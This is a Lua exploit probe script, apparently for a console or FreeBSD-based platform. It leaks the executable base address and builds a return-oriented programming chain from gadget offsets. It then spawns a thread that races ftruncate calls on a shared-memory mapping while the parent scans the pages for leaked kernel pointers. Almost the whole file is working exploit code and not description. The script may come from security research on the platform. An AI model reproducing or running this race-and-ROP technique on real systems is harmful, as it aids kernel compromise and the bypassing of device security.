-- CRASH_CLASS: HIGH
-- PROBE 1110a: SHM ftruncate race — 200 iterations
--
-- 1109a: wq() floods output at 10K iterations
-- Reduce to 200 iters (~3200 wd calls) to avoid binary flood
-- while giving the parent time to race

print("=== PROBE 1110a: SHM RACE 10K (WD CHAIN) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local stub_lo, stub_hi = split(stub)
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)    -- pop rax; ret
local pdr_lo, pdr_hi = eoff(0xC9DFE)  -- pop rdi; ret
local psr_lo, psr_hi = eoff(0xD77D)   -- pop rsi; ret
local bret_lo, bret_hi = eoff(0x42)   -- bare ret
local mwr_lo, mwr_hi = eoff(0x92C67)  -- mov [rdi], rax; ret

local sc477 = mk(477)
local sc480 = mk(480)
local sc482 = mk(482)

local LARGE = 0x40000
local SMALL = 0x4000
local ITERS = 200

-- [A] SHM
print("[A] SHM")
local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)

N(sc480(uint64(shm_fd), uint64(LARGE)))
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local map_n = N(map)
print("map=" .. fmt(map))

for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end

-- TCB (small scale, wq is fine)
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
-- Fill with self-pointers using wd pairs
local tcb_lo, tcb_hi = split(tcb)
for i = 0, 0xFF8, 8 do
    wd(tcb_a + i, tcb_lo)
    wd(tcb_a + i + 4, tcb_hi)
end
local fs_ptr = memory.alloc(8)
wd(N(fs_ptr), tcb_lo)
wd(N(fs_ptr) + 4, tcb_hi)

-- Done flag
local done_flag = memory.alloc(8)
wd(N(done_flag), 0)
wd(N(done_flag) + 4, 0)

-- [B] Build chain using wd() pairs (no binary output)
print(string.format("[B] writing %d-iter chain (wd pairs)...", ITERS))

local ALLOC = 0x200000
local SS = 0x100000
local stk = memory.alloc(ALLOC)
local sb = N(stk)
local rsp = sb + SS - ((sb + SS) % 16) - 8

local pos = 0
local function put(lo, hi)
    wd(rsp + pos * 8, lo)
    wd(rsp + pos * 8 + 4, hi or 0)
    pos = pos + 1
end

-- First gadget after bare_ret: chain starts here
-- sysarch(129, &tcb)
put(pdr_lo, pdr_hi);      put(129, 0)
put(psr_lo, psr_hi);      do local fl, fh = split(N(fs_ptr)); put(fl, fh) end
put(par_lo, par_hi);       put(165, 0)
put(stub_lo, stub_hi)

-- ftruncate loop
for i = 1, ITERS do
    put(pdr_lo, pdr_hi);  put(shm_fd, 0)
    put(psr_lo, psr_hi);  put(SMALL, 0)
    put(par_lo, par_hi);  put(480, 0)
    put(stub_lo, stub_hi)

    put(pdr_lo, pdr_hi);  put(shm_fd, 0)
    put(psr_lo, psr_hi);  put(LARGE, 0)
    put(par_lo, par_hi);  put(480, 0)
    put(stub_lo, stub_hi)
end

-- done marker
put(par_lo, par_hi);       put(0xDEAD1110, 0)
put(pdr_lo, pdr_hi);      do local dl, dh = split(N(done_flag)); put(dl, dh) end
put(mwr_lo, mwr_hi)
-- exit
put(pdr_lo, pdr_hi);      put(0, 0)
put(par_lo, par_hi);       put(431, 0)
put(stub_lo, stub_hi)

print(string.format("  %d entries (%dKB)", pos, pos * 8 / 1024))

-- thr_param (use wq for the 7 small writes, then spawn)
local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
wq(pa + 8, uint64(0))
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(SS))
local tid = memory.alloc(8); wq(N(tid), uint64(0))
wq(pa + 0x30, tid)

-- [C] Race
print("[C] racing")
local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
print("thr_new=" .. (ok1 and N(rv1) or -999))

local kptr_count = 0
local zero_count = 0
local anom_count = 0
local fault_count = 0
local reads = 0
local done_round = 0

for round = 1, 50000 do
    for pg = 1, 7 do
        local ok2, val = pcall(function()
            return memory.read_qword(uint64(map_n + pg * 0x4000))
        end)
        reads = reads + 1
        if not ok2 or val == nil then
            fault_count = fault_count + 1
        else
            local h, l = get_hi_lo(val)
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end

            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 30 then
                    print(string.format("  [KPTR!] r%d p%d: 0x%08X%08X", round, pg, h, l))
                end
            elseif h == 0 and l == 0 then
                zero_count = zero_count + 1
            else
                if l ~= (0xAA000000 + pg) or h ~= (0xBB000000 + pg) then
                    anom_count = anom_count + 1
                    if anom_count <= 30 then
                        print(string.format("  [ANOM] r%d p%d: 0x%08X%08X", round, pg, h, l))
                    end
                end
            end
        end
    end

    local df = rd(N(done_flag))
    if df and df ~= 0 then
        done_round = round
        break
    end

    for pg = 1, 7 do
        pcall(function()
            wd(map_n + pg * 0x4000, 0xAA000000 + pg)
            wd(map_n + pg * 0x4000 + 4, 0xBB000000 + pg)
        end)
    end
end

print("")
print(string.format("done_round=%d reads=%d", done_round, reads))
print(string.format("kptrs=%d anom=%d zeros=%d faults=%d", kptr_count, anom_count, zero_count, fault_count))
print("alive=" .. tostring(alive()))
print("=== PROBE 1110a COMPLETE ===")
